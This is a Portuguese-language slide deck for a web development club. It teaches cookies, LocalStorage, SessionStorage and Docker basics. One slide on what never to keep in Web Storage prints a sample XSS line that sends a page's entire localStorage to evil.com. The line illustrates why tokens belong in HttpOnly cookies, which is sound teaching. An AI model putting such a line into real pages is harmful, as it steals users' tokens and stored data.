---
marp: true
theme: default
paginate: true
style: |
  section {
    background-color: #ffffff;
    color: #1a1a2e;
    font-family: 'Segoe UI', 'Inter', sans-serif;
    padding: 52px 64px;
    font-size: 1rem;
    line-height: 1.6;
  }

  section::after {
    font-size: 0.72rem;
    color: #9ca3af;
  }

  h1 {
    color: #1a1a2e;
    font-size: 1.85rem;
    font-weight: 700;
    margin-bottom: 0.5em;
    letter-spacing: -0.02em;
    border-bottom: 2px solid #be123c;
    padding-bottom: 0.25em;
  }

  h2 {
    color: #6b7280;
    font-size: 0.85rem;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 0.1em;
    margin-bottom: 0.3em;
  }

  h3 {
    color: #be123c;
    font-size: 0.95rem;
    font-weight: 700;
    margin-top: 1em;
    margin-bottom: 0.3em;
    text-transform: uppercase;
    letter-spacing: 0.05em;
  }

  p {
    margin: 0.4em 0;
  }

  code {
    background: #f3f4f6;
    color: #9d174d;
    padding: 1px 6px;
    border-radius: 3px;
    font-size: 0.87em;
    font-family: 'Consolas', 'Courier New', monospace;
    font-weight: 600;
  }

  pre {
    background: #f9fafb;
    border: 1px solid #e5e7eb;
    border-left: 3px solid #be123c;
    padding: 14px 18px;
    border-radius: 0 5px 5px 0;
    margin: 0.7em 0;
  }

  pre code {
    background: transparent;
    color: #111827;
    padding: 0;
    font-size: 0.8em;
    font-family: 'Consolas', 'Courier New', monospace;
    font-weight: 400;
  }

  strong {
    color: #1a1a2e;
    font-weight: 700;
  }

  em {
    color: #6b7280;
    font-style: italic;
  }

  blockquote {
    background: #fff1f2;
    border-left: 3px solid #be123c;
    color: #4b5563;
    padding: 10px 18px;
    border-radius: 0 5px 5px 0;
    margin: 0.8em 0;
    font-style: normal;
    font-size: 0.93em;
  }

  ul, ol {
    padding-left: 1.4em;
    margin: 0.3em 0;
  }

  ul li, ol li {
    margin-bottom: 0.4em;
    line-height: 1.55;
  }

  .columns {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 2.5rem;
    margin-top: 0.5em;
  }

  table {
    font-size: 0.79rem;
    width: 100%;
    border-collapse: collapse;
    margin-top: 0.6em;
  }

  th {
    background: #1a1a2e;
    color: #ffffff;
    padding: 8px 12px;
    text-align: left;
    font-weight: 600;
    font-size: 0.75rem;
    text-transform: uppercase;
    letter-spacing: 0.05em;
  }

  td {
    background: #ffffff;
    padding: 7px 12px;
    border-bottom: 1px solid #e5e7eb;
    color: #374151;
    vertical-align: top;
  }

  tr:nth-child(even) td {
    background: #f9fafb;
  }

  section.cover {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: flex-start;
    text-align: left;
    background: #ffffff;
    border-left: 6px solid #be123c;
    padding-left: 72px;
  }

  section.cover h1 {
    font-size: 2.7rem;
    color: #1a1a2e;
    border: none;
    padding: 0;
    margin-bottom: 0.2em;
    line-height: 1.2;
  }

  section.cover h2 {
    color: #be123c;
    font-size: 0.85rem;
    letter-spacing: 0.12em;
    font-weight: 700;
    margin-bottom: 1.2em;
  }

  section.cover p {
    color: #6b7280;
    font-size: 0.95rem;
    margin-top: 0.5em;
  }

  section.cover strong {
    color: #1a1a2e;
  }
---

<!-- _class: cover -->

## Clube de Desenvolvimento Web — Semana 3

# Armazenamento no Navegador e Containers

*Cookies, LocalStorage, SessionStorage e Docker*

---

# Agenda

1. **Cookies** — o que sao, como funcionam e riscos
2. **LocalStorage e SessionStorage** — armazenamento no cliente
3. **Comparativo** — quando usar cada um
4. **Docker** — o problema que ele resolve
5. **Containers vs VMs** — conceitos fundamentais
6. **Docker na pratica** — imagens, containers, Dockerfile, Compose

> "Entender onde os dados vivem e o primeiro passo para controla-los."

---

<!-- _class: cover -->

## Parte 1

# Cookies

---

# O que e um Cookie?

Um pequeno fragmento de dado que o **servidor envia ao navegador** para ser armazenado e reenviado em requisicoes futuras.

```
1. Navegador faz requisicao:  GET /login  ->  Servidor
2. Servidor responde:
   HTTP/1.1 200 OK
   Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict

3. Nas proximas requisicoes, o navegador envia automaticamente:
   Cookie: session_id=abc123
```

O servidor nao precisa perguntar "quem e voce?" a cada requisicao — o cookie carrega essa informacao.

---

# Para que servem os Cookies?

### Casos de uso principais

- **Sessao autenticada** — manter o usuario logado entre paginas
- **Preferencias do usuario** — idioma, tema, regiao
- **Rastreamento** — analytics, publicidade (cookies de terceiros)
- **Carrinho de compras** — persistir itens entre visitas

### Como criar e ler via JavaScript

```js
// Criar um cookie
document.cookie = "tema=escuro; path=/; max-age=604800";

// Ler todos os cookies da pagina
console.log(document.cookie);
// "tema=escuro; idioma=pt-BR"
```

> O acesso via `document.cookie` e uma interface limitada — nao retorna cookies `HttpOnly`.

---

# Atributos de seguranca dos Cookies

```
Set-Cookie: session_id=abc123;
  HttpOnly;           <- JS nao consegue ler (protege contra XSS)
  Secure;             <- so enviado em HTTPS
  SameSite=Strict;    <- nao enviado em requisicoes cross-site (protege contra CSRF)
  Max-Age=3600;       <- expira em 1 hora
  Path=/api           <- valido apenas para rotas que comecam com /api
```

### Resumo dos atributos

| Atributo | Protege contra | Efeito |
|---|---|---|
| `HttpOnly` | XSS | Oculto para JavaScript |
| `Secure` | Interceptacao | So viaja via HTTPS |
| `SameSite=Strict` | CSRF | Bloqueado em requisicoes externas |
| `Max-Age` / `Expires` | Sessao aberta | Define validade |

---

# Riscos com Cookies

### Session Hijacking

```
Atacante intercepta ou rouba o cookie de sessao
       |
       v
Envia o cookie em propria requisicao
       |
       v
Servidor autenticou — atacante age como a vitima
```

### Como mitigar
- Sempre usar `HttpOnly` + `Secure` + `SameSite`
- Rotacionar `session_id` apos login (session fixation)
- Expirar sessoes inativas no servidor
- Nunca armazenar dados sensiveis dentro do cookie — apenas o ID de sessao

> O cookie em si nao e o problema. O problema e nao protege-lo corretamente.

---

<!-- _class: cover -->

## Parte 2

# LocalStorage e SessionStorage

---

# Web Storage API

Mecanismo nativo do navegador para armazenar dados **no cliente**, sem envio automatico ao servidor.

```js
// LocalStorage — persiste ate ser apagado manualmente
localStorage.setItem("tema", "escuro");
localStorage.getItem("tema");        // "escuro"
localStorage.removeItem("tema");
localStorage.clear();

// SessionStorage — apagado ao fechar a aba
sessionStorage.setItem("rascunho", "texto digitado");
sessionStorage.getItem("rascunho");
```

Ambos armazenam apenas **strings**. Para objetos, use JSON:

```js
const preferencias = { idioma: "pt-BR", notificacoes: true };
localStorage.setItem("prefs", JSON.stringify(preferencias));

const prefs = JSON.parse(localStorage.getItem("prefs"));
```

---

# LocalStorage vs SessionStorage

| Criterio | LocalStorage | SessionStorage |
|---|---|---|
| **Duracao** | Permanente (ate limpar) | Ate fechar a aba |
| **Escopo** | Todas as abas da mesma origem | Apenas a aba atual |
| **Capacidade** | ~5 MB por origem | ~5 MB por origem |
| **Envio ao servidor** | Nunca automatico | Nunca automatico |
| **Acesso** | `window.localStorage` | `window.sessionStorage` |

### Casos de uso tipicos

- **LocalStorage** — preferencias de UI, cache de dados nao sensiveis, modo offline
- **SessionStorage** — rascunhos de formulario, estado temporario de fluxo multi-step

---

# O que NUNCA armazenar no Web Storage

```js
// ERRADO — nunca faca isso
localStorage.setItem("token_jwt", response.token);
localStorage.setItem("senha", "minhasenha123");
localStorage.setItem("cartao_credito", "4111...");
```

### Por que e perigoso

- **Acessivel por qualquer JavaScript da pagina** — XSS le tudo
- Nao tem equivalente ao `HttpOnly` dos cookies
- Um script malicioso injetado pode fazer:

```js
// Script XSS extrai todo o localStorage
fetch("https://evil.com/steal?data=" +
  encodeURIComponent(JSON.stringify(localStorage)));
```

> Tokens de autenticacao pertencem a cookies `HttpOnly`. Nunca ao LocalStorage.

---

# Comparativo geral: Cookies vs Web Storage

| Criterio | Cookie | LocalStorage | SessionStorage |
|---|---|---|---|
| **Enviado ao servidor** | Sim, automatico | Nao | Nao |
| **Acessivel via JS** | Depende (`HttpOnly`) | Sempre | Sempre |
| **Duracao** | Configuravel | Permanente | Por aba |
| **Capacidade** | ~4 KB | ~5 MB | ~5 MB |
| **Uso ideal** | Sessao, autenticacao | Cache, preferencias | Estado temporario |
| **Risco principal** | CSRF, Hijacking | XSS | XSS |

> Regra pratica: se precisa ir ao servidor, use cookie. Se e so para a UI, use Web Storage — mas nunca com dados sensiveis.

---

<!-- _class: cover -->

## Parte 3

# Docker e Containers

---

# O problema que o Docker resolve

```
Desenvolvedor A:          Desenvolvedor B:
Node 18, Ubuntu 22        Node 20, macOS
npm 9.x                   npm 10.x
PostgreSQL 14             PostgreSQL 16
porta 5432 livre          porta 5432 ocupada

"Funciona na minha maquina"   "Na minha nao funciona"
```

A aplicacao funciona em um ambiente especifico — mas nao em outro.

O Docker empacota a aplicacao **junto com todo o seu ambiente de execucao**, garantindo comportamento identico em qualquer maquina.

---

# O que e um Container?

Um processo isolado que executa com seu proprio sistema de arquivos, dependencias e configuracoes — mas **compartilha o kernel do host**.

```
[ Maquina host ]
      |
      |-- [ Container A ]  Node 18 + app frontend
      |-- [ Container B ]  Node 20 + api backend
      |-- [ Container C ]  PostgreSQL 16
      |-- [ Container D ]  Redis 7
```

Cada container enxerga apenas o que foi definido para ele. Nao interferem entre si.

> Um container nao e uma maquina virtual — e muito mais leve e rapido.

---

# Containers vs Maquinas Virtuais

| Criterio | Container | Maquina Virtual |
|---|---|---|
| **Isolamento** | Processo com namespace | Sistema operacional completo |
| **Kernel** | Compartilha o do host | Proprio kernel por VM |
| **Tamanho** | Megabytes | Gigabytes |
| **Inicializacao** | Segundos | Minutos |
| **Overhead** | Minimo | Alto |
| **Portabilidade** | Alta | Media |
| **Casos de uso** | Apps, microservicos, CI/CD | Ambientes completos, seguranca maxima |

```
VM:         [ App ] [ Libs ] [ SO Convidado ] [ Hypervisor ] [ Hardware ]
Container:  [ App ] [ Libs ] [ Container Runtime ] [ SO Host ] [ Hardware ]
```

---

# Imagem vs Container

Dois conceitos centrais do Docker:

```
Imagem
  |
  |-- Snapshot imutavel: SO base + dependencias + codigo + configuracao
  |-- Definida em um Dockerfile
  |-- Armazenada no Docker Hub ou registry privado
  |
  v
Container
  |
  |-- Instancia em execucao de uma imagem
  |-- Tem estado, pode ser iniciado, pausado, removido
  |-- Multiplos containers podem rodar a partir da mesma imagem
```

### Analogia

> **Imagem** = receita de bolo
> **Container** = bolo assado a partir dessa receita

---

# Dockerfile — definindo uma imagem

```dockerfile
# Imagem base oficial do Node.js
FROM node:20-alpine

# Diretorio de trabalho dentro do container
WORKDIR /app

# Copia arquivos de dependencia e instala primeiro (cache eficiente)
COPY package*.json ./
RUN npm install --production

# Copia o restante do codigo
COPY . .

# Porta que o container vai expor
EXPOSE 3000

# Comando executado ao iniciar o container
CMD ["node", "server.js"]
```

### Construir e executar

```bash
docker build -t minha-api:1.0 .
docker run -p 3000:3000 minha-api:1.0
```

---

# Comandos essenciais do Docker

```bash
# Baixar uma imagem do Docker Hub
docker pull node:20-alpine

# Listar imagens locais
docker images

# Criar e executar um container
docker run -d -p 8080:3000 --name minha-api minha-api:1.0

# Listar containers em execucao
docker ps

# Ver logs do container
docker logs minha-api

# Executar comando dentro de um container
docker exec -it minha-api sh

# Parar e remover
docker stop minha-api
docker rm minha-api
```

---

# Docker Compose — orquestrando multiplos containers

Arquivo `docker-compose.yml` define todos os servicos da aplicacao:

```yaml
services:
  api:
    build: .
    ports:
      - "3000:3000"
    environment:
      - DATABASE_URL=postgres://user:senha@db:5432/meubanco
    depends_on:
      - db

  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_USER: user
      POSTGRES_PASSWORD: senha
      POSTGRES_DB: meubanco
    volumes:
      - dados_postgres:/var/lib/postgresql/data

volumes:
  dados_postgres:
```

```bash
docker compose up -d      # sobe tudo em background
docker compose down       # encerra e remove os containers
```

---

# Por que usar Docker hoje?

### No desenvolvimento
- Ambiente identico entre todos os membros do time
- Sem conflitos de versao entre projetos (`nvm`, `pyenv` etc. ficam opcionais)
- Banco de dados local sem instalacao: `docker run -d postgres:16`

### No deploy
- A mesma imagem que rodou no desenvolvimento vai para producao
- Base para Kubernetes e plataformas em nuvem (AWS ECS, GCP Run, Railway)
- CI/CD: pipelines executam testes dentro de containers isolados

### No aprendizado
- Experimentar qualquer tecnologia sem instalar nada permanente
- Limpar tudo com `docker rm` — sem residuos no sistema

> Docker nao e so para grandes empresas. E a forma mais pratica de garantir que o seu projeto roda em qualquer lugar.

---

<!-- _class: cover -->

## Recapitulando

# O que vimos hoje

---

# Resumo

<div class="columns">

**Armazenamento no Navegador**
- Cookie — enviado automaticamente ao servidor, use `HttpOnly` + `Secure` + `SameSite`
- LocalStorage — persiste no cliente, nunca para tokens ou senhas
- SessionStorage — temporario, apagado ao fechar a aba
- XSS acessa tudo que nao e `HttpOnly`

**Docker e Containers**
- Container = ambiente isolado e reproduzivel
- Imagem = snapshot imutavel, Container = instancia em execucao
- Dockerfile define como construir a imagem
- Compose orquestra multiplos servicos juntos
- Elimina o "funciona na minha maquina"

</div>

---

# Desafio da Semana 3

### Nivel iniciante
Crie uma pagina HTML que salva o nome do usuario no `localStorage` e o exibe ao recarregar a pagina — sem perder o dado.

### Nivel intermediario
Construa uma API simples em Node.js, escreva um `Dockerfile` para ela e rode localmente com `docker run`. A API deve responder em `localhost:3000`.

### Nivel avancado
Configure um `docker-compose.yml` com sua API e um banco PostgreSQL. A API deve conectar no banco via variavel de ambiente e ter uma rota que persiste e consulta dados.

---

<!-- _class: cover -->

## Clube de Desenvolvimento Web — Semana 3

# Ambiente reproduzivel e dado no lugar certo

*Nao importa o nivel. Importa entregar — com consciencia de onde os dados vivem.*
